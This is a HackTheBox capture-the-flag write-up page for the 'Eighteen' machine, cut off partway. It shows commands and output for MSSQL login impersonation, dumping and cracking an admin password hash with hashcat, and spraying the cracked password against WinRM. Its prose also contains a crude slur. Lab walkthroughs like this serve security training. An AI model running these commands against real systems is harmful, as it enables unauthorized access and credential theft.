<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/eighteen--htb-s9-machine-writeup/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="Eighteen â€” HTB S9  machine Writeup"><meta property="og:description" content="From low MSSQL creds to DA via impersonation, web hash crack, and WinRM.
Abuse Bad Successor (dMSA) on Server 2025 to dump NTDS and take Administrator."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-11-29T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-29T00:00:00+00:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="Eighteen â€” HTB S9  machine Writeup"><meta name=twitter:description content="From low MSSQL creds to DA via impersonation, web hash crack, and WinRM.
Abuse Bad Successor (dMSA) on Server 2025 to dump NTDS and take Administrator."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="htb,writeups,activemachines,hackthebox,eighteen"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/eighteen--htb-s9-machine-writeup/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/eighteen--htb-s9-machine-writeup/"><meta property="og:title" content="Eighteen â€” HTB S9  machine Writeup"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-11-29T00:00:00Z"><meta property="article:modified_time" content="2025-11-29T00:00:00Z"><meta property="article:author" content="Richie-Havoc"><meta property="article:tag" content="htb"><meta property="article:tag" content="writeups"><meta property="article:tag" content="activemachines"><meta property="article:tag" content="hackthebox"><meta property="article:tag" content="eighteen"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/eighteen--htb-s9-machine-writeup/"><meta name=twitter:title content="Eighteen â€” HTB S9  machine Writeup"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="HTB Eighteen  machine writeup_Author: kavigihan"><meta name=article:summary content="From low MSSQL creds to DA via impersonation, web hash crack, and WinRM.
Abuse Bad Successor (dMSA) on Server 2025 to dump NTDS and take Administrator."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="Â© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="Eighteen â€” HTB S9  machine Writeup"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"Eighteen â€” HTB S9  machine Writeup","description":"From low MSSQL creds to DA via impersonation, web hash crack, and WinRM.\nAbuse Bad Successor (dMSA) on Server 2025 to dump NTDS and take Administrator.","image":"","datePublished":"2025-11-29T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"Eighteen â€” HTB S9  machine Writeup","item":"https:\/\/havocsec.me\/pentesting\/htb\/eighteen--htb-s9-machine-writeup\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2026-04-30"><meta name=htb-machine content="Eighteen â€” HTB S9  machine Writeup"><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">Eighteen â€” HTB S9 machine Writeup</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">HTB Eighteen machine writeup_Author: kavigihan</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Nov 29, 2025 - 8 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/info_hu4c59477cf76329b7ae75418c429275d9_76187_filter_11492400015018413633.webp alt="feature image" height=580 width=736></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><aside>ðŸ§­<p>Goal: Start from low MSSQL creds, pivot via impersonation and web hash crack, reuse to WinRM, map AD with BloodHound, then abuse Bad Successor (dMSA) on Server 2025 to dump NTDS and get Administrator.</p><aside><h3 id=quick-checklist>Quick checklist</h3><ul><li>Add hosts entry for the target</li><li>Fix Kerberos clock skew</li><li>Enumerate MSSQL and impersonate <code>appdev</code></li><li>Extract admin hash from app DB and crack</li><li>Password spray to WinRM and get shell as <code>adam.scott</code></li><li>Run SharpHound and analyze in BloodHound</li><li>Confirm OU write on Staff and Bad Successor path</li><li>Create dMSA, request ticket, dump NTDS</li><li>Log in as Administrator and grab root flag</li></ul><hr><h2 id=1-external-enumeration>1) External enumeration</h2><h3 id=nmap-essentials>Nmap essentials</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -p- -Pn -sCV 10.129.xx.xx
</span></span></code></pre></div><p><img src=nmap.png alt="nmap scan"></p><p>Findings:</p><ul><li>80/tcp IIS 10</li><li>1433/tcp MSSQL 2022</li><li>5985/tcp WinRM</li><li>Clock skew ~+7h (breaks Kerberos)</li></ul><h3 id=fix-clock-skew>Fix clock skew</h3><ul><li>Option A (temporary): run commands with faketime</li><li>Option B (recommended): sync to target with ADUtilities fixtime script</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo ntpdate 10.10.11.95 or use fixtime.sh
</span></span></code></pre></div><p>Refs: <a href=http://fixtime.sh>fixtime.sh</a> Â· <a href=https://github.com/5epi0l/ADUtilities>ADUtilities</a></p><h3 id=hosts-entry>Hosts entry</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;10.129.xx.xx  eighteen.htb DC01.eighteen.htb&#34;</span> | sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id=web-recon>Web recon</h3><p>Visit <a href=http://eighteen.htb>http://eighteen.htb</a>`</p><p><img src=log.png alt="create user"></p><p>sign up a normal user</p><p><img src=login.png alt="sign up and login"></p><p>Admin area exists at <code>/dashboard</code> but is restricted so nothing much here.</p><hr><h2 id=2-mssql-logins-and-impersonation>2) MSSQL: logins and impersonation</h2><p>Starting creds: <code>kevin / iNa2we6haRj2gaw!</code></p><p>List modules and logins:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nxc mssql -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth -L
</span></span><span style=display:flex><span>sudo nxc mssql 10.129.xx.xx -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth -M enum_logins
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>â””â”€$ sudo nxc mssql -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth -L   
</span></span><span style=display:flex><span>LOW PRIVILEGE MODULES
</span></span><span style=display:flex><span>ENUMERATION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> enum_impersonate          Enumerate users with impersonation privileges
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> enum_links                Enumerate linked SQL Servers and their login configurations.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> enum_logins               Enumerate SQL Server logins <span style=color:#f92672>(</span>SQL, Domain, Local users<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PRIVILEGE_ESCALATION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> enable_cmdshell           Enable or disable xp_cmdshell in MSSQL Server
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> exec_on_link              Execute commands on a SQL Server linked server
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> link_enable_cmdshell      Enable or disable xp_cmdshell on a linked MSSQL server
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> link_xpcmd                Run xp_cmdshell commands on a linked SQL server
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> mssql_priv                Enumerate and exploit MSSQL privileges
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HIGH PRIVILEGE MODULES <span style=color:#f92672>(</span>requires admin privs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>ENUMERATION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> test_connection           Pings a host
</span></span><span style=display:flex><span>CREDENTIAL_DUMPING
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
</span></span><span style=display:flex><span>PRIVILEGE_ESCALATION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> empire_exec               Uses Empire<span style=color:#960050;background-color:#1e0010>&#39;</span>s RESTful API to generate a launcher <span style=color:#66d9ef>for</span> the specified listener and executes it
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> met_inject                Downloads the Meterpreter stager and injects it into memory
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
</span></span></code></pre></div><pre tabindex=0><code>â””â”€$ sudo nxc mssql 10.129.xx.xx -u kevin -p &#39;iNa2we6haRj2gaw!&#39; --local-auth -M enum_logins
MSSQL       10.129.xx.xx    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
ENUM_LOGINS 10.129.xx.xx    1433   DC01             [*] Enumerated logins
ENUM_LOGINS 10.129.xx.xx    1433   DC01             Login Name                          Type            Status
ENUM_LOGINS 10.129.xx.xx    1433   DC01             ----------                          ----            ------
ENUM_LOGINS 10.129.xx.xx    1433   DC01             appdev                              SQL User        ENABLED
ENUM_LOGINS 10.129.xx.xx    1433   DC01             kevin                               SQL User        ENABLED
ENUM_LOGINS 10.129.xx.xx    1433   DC01             sa                                  SQL User        ENABLED
</code></pre><p>we got various usersÂ <code>appdev</code>,Â <code>kevin</code>Â andÂ <code>sa</code>.</p><p>So lets Check impersonation:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nxc mssql 10.129.xx.xx -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth -M enum_impersonate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>â””â”€$ sudo nxc mssql 10.129.xx.xx -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth -M enum_impersonate
</span></span><span style=display:flex><span>MSSQL       10.129.xx.xx    <span style=color:#ae81ff>1433</span>   DC01             <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Windows <span style=color:#ae81ff>11</span> / Server <span style=color:#ae81ff>2025</span> Build <span style=color:#ae81ff>26100</span> <span style=color:#f92672>(</span>name:DC01<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:eighteen.htb<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>MSSQL       10.129.xx.xx    <span style=color:#ae81ff>1433</span>   DC01             <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> DC01<span style=color:#ae81ff>\k</span>evin:iNa2we6haRj2gaw! 
</span></span><span style=display:flex><span>ENUM_IMP... 10.129.xx.xx    <span style=color:#ae81ff>1433</span>   DC01             <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Users with impersonation rights:
</span></span><span style=display:flex><span>ENUM_IMP... 10.129.xx.xx    <span style=color:#ae81ff>1433</span>   DC01             <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span>   - appdev
</span></span></code></pre></div><p>Connect and assume <code>appdev</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>impacket-mssqlclient eighteen.htb/kevin:<span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span>@10.129.xx.xx
</span></span><span style=display:flex><span><span style=color:#75715e># in SQL shell</span>
</span></span><span style=display:flex><span>exec_as_login appdev
</span></span></code></pre></div><p><img src=impacket.png alt=impacket-mssqlclient></p><pre tabindex=0><code>â””â”€$ impacket-mssqlclient eighteen.htb/kevin:&#39;iNa2we6haRj2gaw!&#39;@10.129.xx.xx              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to &#39;master&#39;.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)&gt; exec_as_login appdev
SQL (appdev  appdev@master)&gt;
</code></pre><p>Enumerate DBs and dump users:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>enum_db;
</span></span><span style=display:flex><span>USE financial_planner;
</span></span><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> INFORMATION_SCHEMA.TABLES;
</span></span><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> users;
</span></span></code></pre></div><pre tabindex=0><code>SQL (appdev  appdev@master)&gt; enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   

tempdb                              0   

model                               0   

msdb                                1   

financial_planner                   0
SQL (appdev  appdev@master)&gt; USE financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to &#39;financial_planner&#39;.
SQL (appdev  appdev@financial_planner)&gt; SELECT * FROM INFORMATION_SCHEMA.TABLES;
[%] SELECT * FROM INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG       TABLE_SCHEMA   TABLE_NAME    TABLE_TYPE   
-----------------   ------------   -----------   ----------   
financial_planner   dbo            users         b&#39;BASE TABLE&#39;   

financial_planner   dbo            incomes       b&#39;BASE TABLE&#39;   

financial_planner   dbo            expenses      b&#39;BASE TABLE&#39;   

financial_planner   dbo            allocations   b&#39;BASE TABLE&#39;   

financial_planner   dbo            analytics     b&#39;BASE TABLE&#39;   

financial_planner   dbo            visits        b&#39;BASE TABLE&#39;
SQL (appdev  appdev@financial_planner)&gt; SELECT * FROM users;
[%] SELECT * FROM users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
</code></pre><p>We got this nigga financial planner so we used it and enumarated the database ,,,,,,,and for sure we got what we needed the credentials</p><p>we got the admin hash</p><pre tabindex=0><code>pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
</code></pre><aside>ðŸ’¡<p>Find an admin account with a PBKDF2â€‘SHA256 (Werkzeug) hash in the <code>users</code> table.</p></aside><hr><h2 id=3-crack-werkzeug-pbkdf2sha256-with-hashcat>3) Crack Werkzeug PBKDF2â€‘SHA256 with Hashcat</h2><p>Convert to Hashcat Generic KDF format and crack <code>-m 10900</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 - <span style=color:#e6db74>&lt;&lt; &#39;PY&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>import base64, binascii
</span></span></span><span style=display:flex><span><span style=color:#e6db74>h=&#39;pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133&#39;.split(&#39;$&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>print(f&#34;sha256:{h[0].split(&#39;:&#39;)[2]}:{base64.b64encode(h[1].encode()).decode()}:{base64.b64encode(binascii.unhexlify(h[2])).decode()}&#34;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>PY</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>10900</span> hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>10900</span> hash.txt /usr/share/wordlists/rockyou.txt --show
</span></span></code></pre></div><p>Recovered: <code>admin:iloveyou1</code></p><p>Letâ€™s use this credentials to login back to website and check theÂ <code>Admin</code>Â section to see if we can find anything useful.</p><p><img src=admindash.png alt="admin dashboard"></p><p>Refs: <a href=https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash>0xdf note</a> Â· <a href=https://hashcat.net/forum/thread-8391-post-44775.html#pid44775>Hashcat thread</a></p><hr><h2 id=4-spray-to-winrm-and-get-a-foothold>4) Spray to WinRM and get a foothold</h2><p>RID brute for users:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nxc mssql DC01.eighteen.htb -u kevin -p <span style=color:#e6db74>&#39;iNa2we6haRj2gaw!&#39;</span> --local-auth --rid-brute
</span></span></code></pre></div><p>Create users.txt and spray the cracked password:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nxc winrm DC01.eighteen.htb -u users.txt -p <span style=color:#e6db74>&#39;iloveyou1&#39;</span> --no-bruteforce
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>â””â”€$ sudo nxc winrm DC01.eighteen.htb -u users.txt -p <span style=color:#e6db74>&#39;iloveyou1&#39;</span> --no-bruteforce             
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Windows <span style=color:#ae81ff>11</span> / Server <span style=color:#ae81ff>2025</span> Build <span style=color:#ae81ff>26100</span> <span style=color:#f92672>(</span>name:DC01<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>domain:eighteen.htb<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\A</span>dministrator:iloveyou1
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\m</span>ssqlsvc:iloveyou1
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\j</span>amie.dunn:iloveyou1
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\j</span>ane.smith:iloveyou1
</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\a</span>lice.jones:iloveyou1
